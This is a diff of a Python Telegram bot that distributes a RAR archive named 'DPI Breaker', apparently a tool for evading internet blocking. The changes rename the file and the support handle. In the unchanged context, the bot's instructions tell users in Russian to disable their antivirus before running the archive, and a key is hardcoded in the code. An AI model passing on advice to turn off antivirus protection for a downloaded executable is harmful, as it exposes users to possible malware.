@@ -22,7 +22,7 @@ bot = telebot.TeleBot(TOKEN)
 KEY = "wZyeex3lBXA4H77KP5vM"
 
 # Путь к RAR файлу
-DPI_FILE = 'DPI_Breaker.rar'
+DPI_FILE = 'DPI Breaker.rar'
 
 @bot.message_handler(commands=['start'])
 def start(message):
@@ -75,7 +75,7 @@ def callback_handler(call):
                            f"3. Введите ключ\n"
                            f"4. Наслаждайтесь 7 днями без блокировок!\n\n"
                            f"⚠️ Рекомендуется временно отключить антивирус, так как он может блокировать приложение.\n"
-                           f"💬 Поддержка: @dpibreak_support",
+                           f"💬 Поддержка: @dpibreaksupport",
                     parse_mode='Markdown'
                 )
             
@@ -97,6 +97,7 @@ if __name__ == '__main__':
     logger.info(f"Ключ: {KEY}")
     
     bot.infinity_polling(none_stop=True, interval=1, timeout=30)
+
 
 
 
